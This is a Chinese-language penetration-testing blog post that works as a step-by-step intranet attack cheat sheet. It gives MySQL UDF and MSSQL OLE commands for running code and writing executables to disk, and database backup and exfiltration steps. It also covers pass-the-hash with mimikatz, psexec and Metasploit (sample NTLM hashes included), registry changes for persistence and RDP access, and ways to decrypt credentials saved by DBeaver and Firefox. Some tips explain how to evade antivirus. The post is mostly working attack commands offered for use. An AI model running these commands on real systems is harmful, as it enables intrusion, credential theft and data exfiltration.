<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>内网渗透流水账 | 😊#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="0x01 环境
Linux主机www权限
主机无法出外网
正向代理无法使用
B段内网

收集信息#####F-Scrack.py
获取Redis, ES等
PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6



Rediskey较多的时候不要使用keys *
查看基本信息: master，数量，版本号
使用scan查看keys: scan 0 match * count 100 
查看类型: type &amp;lt;key&amp;gt;
hash类型: hgetall &amp;lt;key&amp;gt;

MySQLwindows下可以先测试是否可写入插件目录:"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="内网渗透流水账"/>
  <meta property="og:site_name" content="😊#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">😊#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 内网渗透流水账</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
<li>Linux主机www权限</li>
<li>主机无法出外网</li>
<li>正向代理无法使用</li>
<li>B段内网</li>
</ol>
<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
使用scan查看keys: scan 0 match * count 100 
查看类型: type &lt;key&gt;
hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
<pre class="line-numbers language-none"><code class="language-none">select @@plugin_dir;

select hello into outfile &lt;plugin_dir&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后使用msf的自带的udf，先转换为16进制，然后导出到插件目录:</p>
<pre class="line-numbers language-none"><code class="language-none">use test;
set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);
create table Ghost(data LONGBLOB);
insert into Ghost values(&quot;&quot;);
update Ghost set data &#x3D; @a;
select data from Ghost into DUMPFILE &lt;dir&gt;;
create function sys_eval returns string soname &#39;sys_eval.dll&#39;;

drop function sys_eval; &#x2F;&#x2F;用完删除，养成好习惯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong><code>首选sys_eval, 尽量不要使用sys_exec(会崩溃)</code></strong></p>
<h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>mssql爆破尽量放在后面执行，动静会比较大。</p>
<pre class="line-numbers language-none"><code class="language-none">mssql爆破成功之后，最好使用CLR来获取权限，直接使用&#96;xp_cmdshell&#96;会死翘翘,360会拦截
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>已知mssql的用户密码，certutil等工具会被拦截或者报警，可以使用mssql自带的工具写入到硬盘：</p>
<p>现开启存储过程:</p>
<pre class="line-numbers language-none"><code class="language-none">sp_configure &#39;show advanced options&#39;, 1;  
GO  
RECONFIGURE;  
GO  
sp_configure &#39;Ole Automation Procedures&#39;, 1;  
GO  
RECONFIGURE;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="mssql写大文件"><a href="#mssql写大文件" class="headerlink" title="mssql写大文件"></a>mssql写大文件</h5><p>比如exe之类的先转换为hex,然后再写入到文件:</p>
<p><code>xxd -plain /tmp/test.exe | tr -d &#39;\n&#39; &gt; /tmp/dll.hex</code></p>
<pre class="line-numbers language-none"><code class="language-none">declare @hexstring varchar(max);
set @hexstring &#x3D; &#39;转换之后的hex&#39;;
declare @file varbinary(max);
set @file &#x3D; (select cast(&#39;&#39; as xml).value(&#39;xs:hexBinary( substring(sql:variable(&quot;@hexstring&quot;), sql:column(&quot;t.pos&quot;)) )&#39;, &#39;varbinary(max)&#39;)
from (select case substring(@hexstring, 1, 2) when &#39;0x&#39; then 3 else 0 end) as t(pos));

select @file;
declare @init int;
declare @filepath nvarchar(4000) &#x3D; N&#39;c:\22.exe&#39;;

EXEC sp_OACreate &#39;ADODB.Stream&#39;, @init OUTPUT; -- An instace created
EXEC sp_OASetProperty @init, &#39;Type&#39;, 1;
EXEC sp_OAMethod @init, &#39;Open&#39;; -- Calling a method
EXEC sp_OAMethod @init, &#39;Write&#39;, NULL, @file; -- Calling a method
EXEC sp_OAMethod @init, &#39;SaveToFile&#39;, NULL, @filepath, 2; -- Calling a method
EXEC sp_OAMethod @init, &#39;Close&#39;; -- Calling a method
EXEC sp_OADestroy @init; -- Closed the resources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="mssql备份"><a href="#mssql备份" class="headerlink" title="mssql备份"></a>mssql备份</h4><pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE &lt;db&gt;
TO DISK &#x3D; &#39;C:\Windows\temp\db.bak&#39; WITH COMPRESSION, INIT, STATS &#x3D; 5;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>分卷压缩</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">rar.exe a -m0 -v100m C:\windows\temp\db.split C:\windows\tasks\db.bak

download C:\\windows\\temp\\db.split.rar &#x2F;var&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h4><ul>
<li>wmi</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.1.158 &#x2F;user:pt007 &#x2F;password:admin123  process call create &quot;cmd.exe &#x2F;c ipconfig&gt;d:\result.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>推荐使用wmiexec.vbs:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs">https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs</a></p>
<pre class="line-numbers language-none"><code class="language-none">cscript C:\Windows\Tasks\aliwmi.vbs &#x2F;cmd &lt;ip&gt;  &quot;C:\Windows\system32\calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>msf</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec 
show options
set RHOST 192.168.81.129
set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
set SMBUser Administrator
show options
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>mimikatz || Cobalt Strike</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;sekurlsa::pth &#x2F;domain:. &#x2F;user:administrator &#x2F;ntlm:2D20D252A479F485CDF5E171D93985BF &#x2F;run:cmd.exe&quot; &#x2F;&#x2F;传递hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>psexec</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">psexec &#x2F;accepteula &#x2F;&#x2F;接受许可协议
sc delete psexesvc
psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>psexec.vbs</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">cscript psexec.vbs 192.168.1.158 pt007 admin123 &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>远程命令执行sc</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.17.138\c$ &quot;admin123&quot; &#x2F;user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
sc \\192.168.17.138 create test binpath&#x3D; &quot;c:\test.exe&quot;
sc \\192.168.17.138 start test
sc \\192.168.17.138 del test
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>windows远程执行cmd的9种方法: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5957">https://xz.aliyun.com/t/5957</a></p>
<h3 id="access-is-denied"><a href="#access-is-denied" class="headerlink" title="access is denied"></a>access is denied</h3><p>对于任何非RID 500的本地管理员(Administrator)连接到Windows Vista+的计算机，无论采用wmi、psexec还是其它方法，使用的令牌都是中等令牌, 使用wmiexec的时候会修暗示Access is Denied</p>
<p>在抓取hash的情况下，可以修改注册表，使得本地管理员组成员都可以远程连接,作为一种持久化的手段。</p>
<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>###RDP的PTH<br>抓取hash无法破解的情况下，如果使用hash远程登录RDP，需要被登录的系统开启”Restricted Admin Mode”, 在Windows8.1和Windows Server 2012R2上默认开启。Windows7和WinServer 2008需要安装2871997、2973351布丁。</p>
<h4 id="启动RDP"><a href="#启动RDP" class="headerlink" title="启动RDP"></a>启动RDP</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f
REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f  # 监听 3389 端口 

开启3389
wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="开启Restricted-Admin-mode"><a href="#开启Restricted-Admin-mode" class="headerlink" title="开启Restricted Admin mode"></a>开启Restricted Admin mode</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="增加防火墙规则"><a href="#增加防火墙规则" class="headerlink" title="增加防火墙规则"></a>增加防火墙规则</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; dir&#x3D;in protocol&#x3D;TCP localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="dump-passwod"><a href="#dump-passwod" class="headerlink" title="dump passwod"></a>dump passwod</h3><p>####dbeaver</p>
<p>dbeaver6的配置文件(不同版本存储的位置和解密方式不一样):</p>
<pre class="line-numbers language-none"><code class="language-none">#密码加密存储位置:
C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\credentials-config.json

#url和用户名:
C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\data-sources.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解密脚本: <a target="_blank" rel="noopener" href="https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61">https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61</a></p>
<p>下载<code>credentials-config.json</code>脚本之后，使用python解密:<code>python decrypt.py credentials-config.json</code>，然后根据解密出来的id去<code>data-sources.json</code>里面找对应的IP和用户名。</p>
<p>老版本的密码是存储在:<code>C:\Users\&lt;users&gt;\.dbeaver4\General\.dbeaver-data-source.xml</code>，可以直接使用在线解密:<a target="_blank" rel="noopener" href="http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/">http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/</a></p>
<h3 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h3><p>有一个<code>.ini</code>的文件，有对应的IP信息和私钥地址<br>老版本的存储: C:\Users%USERNAME%\AppData\Roaming\MobaXterm<br>2020年的版本: C:\Users%USERNAME%\Documents\MobaXterm</p>
<h3 id="VSCODE"><a href="#VSCODE" class="headerlink" title="VSCODE"></a>VSCODE</h3><p>Windows下的配置文件在这个地方:</p>
<pre class="line-numbers language-none"><code class="language-none">%APPDATA%\Code\User\settings.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以根据配置文件找到笔记和ssh等存储位置</p>
<h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>三好师傅讲的很详细，我选择使用firepwd.py:</p>
<pre class="line-numbers language-none"><code class="language-none">firefox的配置文件目录:
%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\

下载解密需要的文件:
key4.db和logins.json

下载解密脚本:
https:&#x2F;&#x2F;github.com&#x2F;lclevy&#x2F;firepwd

上面三个东西放在一个文件夹:
python3 firepwd.py <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p>
<h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><ol>
<li>CS里面的<code>screenshot</code></li>
<li>msf里面: <code>use espia</code> <code>screengrab</code></li>
<li>msf的持续截屏: <code>post/windows/gather/screen_spy</code></li>
<li>Win10自带: <code>psr.exe /start /gui 0 /output C:\cool.zip /maxlogsize 1</code></li>
</ol>
<h3 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h3><pre class="line-numbers language-none"><code class="language-none">在C盘搜索script.js这个文件:
dir &#x2F;s &#x2F;b C:\script.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

	</div>

	
	<span id="/2020/05/14/workgroup-pentest2.html" class="leancloud-visitors view" data-flag-title="内网渗透流水账">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2020/07/16/Com-Object-Pentest-Note2.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2020/05/06/python-elk.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2020-05-14 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-article-text">0x01 环境</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-article-text">收集信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Redis"><span class="toc-article-text">Redis</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MySQL"><span class="toc-article-text">MySQL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mssql"><span class="toc-article-text">mssql</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#mssql%E5%86%99%E5%A4%A7%E6%96%87%E4%BB%B6"><span class="toc-article-text">mssql写大文件</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mssql%E5%A4%87%E4%BB%BD"><span class="toc-article-text">mssql备份</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#pth"><span class="toc-article-text">pth</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#access-is-denied"><span class="toc-article-text">access is denied</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%90%AF%E5%8A%A8RDP"><span class="toc-article-text">启动RDP</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BC%80%E5%90%AFRestricted-Admin-mode"><span class="toc-article-text">开启Restricted Admin mode</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A2%9E%E5%8A%A0%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99"><span class="toc-article-text">增加防火墙规则</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#dump-passwod"><span class="toc-article-text">dump passwod</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MobaXterm"><span class="toc-article-text">MobaXterm</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#VSCODE"><span class="toc-article-text">VSCODE</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Firefox"><span class="toc-article-text">Firefox</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%88%AA%E5%B1%8F"><span class="toc-article-text">截屏</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-article-text">搜索文件</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
